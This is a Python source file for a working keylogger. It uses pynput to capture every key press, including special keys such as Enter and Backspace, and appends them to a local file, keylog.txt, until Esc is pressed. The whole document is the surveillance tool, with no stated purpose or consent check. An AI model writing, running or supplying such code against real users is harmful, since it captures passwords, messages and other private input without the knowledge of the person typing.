from pynput import keyboard
from datetime import datetime

# File where the keystrokes will be logged
log_file = "keylog.txt"

# Function to handle the key press event
def on_press(key):
    try:
        # Log the alphanumeric key
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Log the special keys with their names
        with open(log_file, "a") as f:
            # For better readability, use common names for some special keys
            key_name = str(key).replace("Key.", "")
            if key_name == 'space':
                f.write(' [SPACE] ')
            elif key_name == 'enter':
                f.write(' [ENTER]\n')
            elif key_name == 'tab':
                f.write(' [TAB] ')
            elif key_name == 'backspace':
                f.write(' [BACKSPACE] ')
            else:
                f.write(f" [{key_name.upper()}] ")

# Function to handle the key release event
def on_release(key):
    # Stop the keylogger when the 'esc' key is released
    if key == keyboard.Key.esc:
        return False

# Main function to start the keylogger
def main():
    print("Keylogger is running... Press 'esc' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Entry point of the script
if __name__ == "__main__":
    main()
